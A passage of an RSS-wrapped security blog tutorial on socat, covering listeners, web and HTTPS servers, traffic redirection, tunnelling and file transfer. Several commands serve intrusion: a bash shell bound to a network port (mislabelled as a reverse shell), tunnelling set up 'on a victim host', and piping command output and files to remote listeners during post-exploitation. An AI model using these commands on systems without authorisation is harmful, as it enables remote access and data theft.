&lt;h3 id=&quot;socat-listener&quot;&gt;Socat Listener&lt;/h3&gt;

&lt;p&gt;The following command tells Socat to use the TCP protocol and listen on port 123 and print any given information from a client to the terminal(STDOUT). The &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt; value can be changed and specific versions can be used such as TCP4, TCP6, TCP4-LISTEN, and TCP6-LISTEN. The &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt; value can also be changed to emulate a UDP listener.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP4-LISTEN:123 STDOUT
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To connect to this server, the following command can be issued.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP:192.168.1.81:123 -
&amp;gt; hello
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This will send the world &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt; to the socat listener listening on port 123.&lt;/p&gt;

&lt;p&gt;Something similar to the following can also be issued to take something from STDIN and send that to a listener.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whoami | socat STDIN TCP:192.168.1.81:123
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;A useful example of this would be the below where a UDP packet can be created from STDIN and send to a host using socat.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo “UDP packet” | Socat STDIO UDP4-DATAGRAM:192.168.2.1:123
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h3&gt;
&lt;p&gt;The below one liner is an example of binding the bash shell to a port and connecting to it.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/test# socat TCP-LISTEN:1337 EXEC:/bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;socat-web-server&quot;&gt;Socat web server&lt;/h3&gt;
&lt;p&gt;To start a web server with Socat, the following command can be issued. The &lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt; option tells Socat to be verbose and the &lt;code class=&quot;highlighter-rouge&quot;&gt;-T&lt;/code&gt; option can be used to set timeouts.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat -v -T0.05 tcp-l:80,reuseaddr,fork system:&quot;echo 'HTTP/1.1 200 OK'; echo 'Connection: close'; echo; cat&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h4 id=&quot;https-server&quot;&gt;HTTPS server&lt;/h4&gt;

&lt;p&gt;Socat can also be used to setup HTTPS servers. In the below example, a self-signed certificate is created using Openssl and it is used to setup a HTTPS server.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
cat key.pem &amp;gt;&amp;gt; cert.pem 
socat OPENSSL-LISTEN:443,cert=/root/test/cert.pem -
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The following command can also be using as an alternative to Openssl client and connect to services using SSL/TLS.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat - OPENSSL:192.168.1.81:443
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;terminal-emulation&quot;&gt;Terminal Emulation&lt;/h3&gt;

&lt;p&gt;In scenarios where commands need to be issued to a network medium without using a terminal emulator, the following command can be useful.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat READLINE,history:/tmp/serialcommands.txt \
  OPEN:/dev/ttyS0,ispeed=9600,ospeed=9600,crnl,raw,sane,echo=false
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;redirecting-traffic&quot;&gt;Redirecting Traffic&lt;/h3&gt;
&lt;p&gt;In scenarios where you want to take incoming connections and redirect it to a Linux application, the following command can be used.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP-LISTEN:443,reuseaddr,fork UNIX-CLIENT:/tmp/foo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;You can also specify the bind address and specify what IP ranges can connect to this listener.  The &lt;code class=&quot;highlighter-rouge&quot;&gt;su=nobody&lt;/code&gt; value will ensure that forked processes will run as the nobody low-privileged user&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP-LISTEN:443,bind=127.0.0.1,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;tunnelling&quot;&gt;Tunnelling&lt;/h3&gt;
&lt;p&gt;Socat can also be a good alternative to SSH when looking for a way to tunnel traffic. The following command can be used on a victim host to capture incoming traffic from port 1022 and send it to 192.168.1.70:22&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP4-LISTEN:1022,reuseaddr,fork TCP4:192.168.1.70:22
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;file-transfer&quot;&gt;File transfer&lt;/h3&gt;
&lt;p&gt;File transfers can also be conducted with ease using Socat.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat FILE:data.txt TCP:192.168.1.81:1337
socat TCP-LISTEN:1337 OPEN:data.txt,creat,trunc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;However, since Socat isn’t available by default on most systems, Netcat is a better/easier option during post exploitation phases. The static compiled binary version for Socat can be found here if installation in not possible: https://github.com/andrew-d/static-binaries&lt;/p&gt;

</description>
        <pubDate>Wed, 21 Mar 2018 08:43:59 +0000</pubDate>
        <link>http://snoopysecurity.github.io/network_security/2018/03/21/introduction_to_socat.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/network_security/2018/03/21/introduction_to_socat.html</guid>
        
        
        <category>network_security</category>
        
      </item>
    
  </channel>
</rss>
